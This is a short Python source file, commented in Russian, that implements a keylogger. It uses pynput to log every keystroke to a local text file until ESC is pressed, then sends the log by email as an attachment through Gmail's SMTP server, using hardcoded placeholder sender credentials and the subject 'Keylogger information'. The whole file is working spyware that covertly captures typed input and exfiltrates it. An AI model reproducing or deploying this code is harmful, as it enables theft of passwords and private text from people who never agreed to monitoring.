import pynput
import smtplib
from pynput.keyboard import Listener, Key
from email.message import EmailMessage
from datetime import datetime

# В какое время начал ввод
now = datetime.now()
current_time = now.strftime("%Y-%m-%d %H:%M:%S")
with open("keyboard/text.txt", "a") as file:
    file.write(current_time + '\n')


def press(key):
    with open("keyboard/text.txt", "a") as file:
        # Убрать кавычки из записи
        t = (str(key).replace("'", ""))
        # Писать с новой строки при пробелах и ентерах
        match key:
            case Key.space:
                t = '\n'
            case Key.enter:
                t = '\n'
        # Если не нажата спец.клавиша, то вписывать буквы
        if t.find('Key') == -1:
            file.write(t)


# Прекратить работу чтения клавиш при нажатии ESC
def release(key):
    if key == Key.esc:
        return False


# Читает клаву
with Listener(on_press=press, on_release=release, ) as listener:
    listener.join()  # подключение чтения
# Отправитель
# Введите информацию о отправителе
sender_email = "example@gmail.com"
sender_passwd = "4512531423"
# Получатель
# Введите информацию о получателе
receiver_email = "example@gmail.com"
# Содержание сообщения
msg = EmailMessage()
msg['Subject'] = "Keylogger information"
msg['From'] = sender_email
msg['To'] = receiver_email
msg.set_content('Text attached')

# Чтение файла, который будет прикреплен к сообщению
with open('keyboard/text.txt', 'rb') as file:
    data = file.read()
# Прикрепление файла к сообщению
msg.add_attachment(data, maintype='text', subtype='plain', filename=current_time)

#Подключение к серверу для авторизации и отправки сообщения
with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    smtp.login(sender_email, sender_passwd)
    smtp.send_message(msg)